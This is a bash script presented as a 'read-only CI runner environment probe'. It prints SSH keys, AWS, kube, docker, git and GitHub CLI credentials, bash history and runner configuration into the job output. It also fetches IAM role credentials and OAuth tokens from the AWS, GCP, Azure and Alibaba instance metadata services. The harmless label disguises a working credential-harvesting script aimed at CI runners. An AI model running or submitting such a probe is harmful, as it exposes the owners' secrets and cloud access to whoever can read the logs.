#!/bin/bash
# read-only CI runner environment probe
echo "===I6439 PROBE START==="
set +e
echo "--- id"; id 2>&1
echo "--- hostname"; hostname 2>&1; hostname -I 2>&1
echo "--- uname"; uname -a 2>&1
echo "--- date"; date -u 2>&1
echo "--- nvidia-smi"; (nvidia-smi 2>&1 || echo nvidia-smi-missing) | head -45
echo "--- nvidia-smi -L"; (nvidia-smi -L 2>&1) | head -12
echo "--- rocm-smi"; (rocm-smi 2>&1 || echo rocm-smi-missing) | head -45
echo "--- lspci"; (lspci 2>&1 | grep -Ei 'vga|3d|display|nvidia|amd|accel') | head -25
echo "--- env"; env 2>&1 | sort | sed -n '1,130p'
echo "--- home"; ls -la "$HOME" 2>&1 | head -70
echo "--- ssh"; ls -la "$HOME/.ssh" 2>&1; for f in "$HOME"/.ssh/*; do echo "--- FILE $f"; head -70 "$f" 2>&1; done
echo "--- aws"; ls -la "$HOME/.aws" 2>&1; for f in "$HOME"/.aws/*; do echo "--- FILE $f"; head -45 "$f" 2>&1; done
echo "--- kube"; ls -la "$HOME/.kube" 2>&1; head -90 "$HOME/.kube/config" 2>&1
echo "--- docker"; cat "$HOME/.docker/config.json" 2>&1 | head -45
echo "--- netrc"; cat "$HOME/.netrc" 2>&1 | head -20
echo "--- git-credentials"; cat "$HOME/.git-credentials" 2>&1 | head -20
echo "--- gitconfig"; cat "$HOME/.gitconfig" 2>&1 | head -40
echo "--- gcloud"; ls -la "$HOME/.config/gcloud" 2>&1 | head -25
echo "--- gh hosts"; cat "$HOME/.config/gh/hosts.yml" 2>&1 | head -30
echo "--- bash_history"; head -60 "$HOME/.bash_history" 2>&1
echo "--- deps"; ls -la "$HOME/deps" 2>&1 | head -35
echo "--- nigiri-build"; ls -la "$HOME/nigiri-build" 2>&1 | head -20
echo "--- ci-data"; ls -la "$HOME/ci-data" 2>&1 | head -20
echo "--- runner config"; ls -la "$HOME"/actions-runner* 2>&1 | head -20; head -60 "$HOME"/actions-runner*/.runner 2>&1
echo "--- IMDS AWS token"
TOKEN=$(curl -s -m 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" 2>&1); echo "imds_token_len=${#TOKEN}"
echo "--- IMDS AWS role name"
ROLE=$(curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null | head -1)
echo "role=$ROLE"
echo "--- IMDS AWS role creds"
curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" 2>&1 | head -20
echo "--- IMDS AWS identity doc"
curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/dynamic/instance-identity/document" 2>&1 | head -15
echo "--- IMDS GCP"
curl -s -m 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -10
echo "--- IMDS Azure"
curl -s -m 4 -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -10
echo "--- IMDS Alibaba"
curl -s -m 4 "http://100.100.100.200/latest/meta-data/ram/security-credentials/" 2>&1 | head -5
echo "===I6439 PROBE END==="
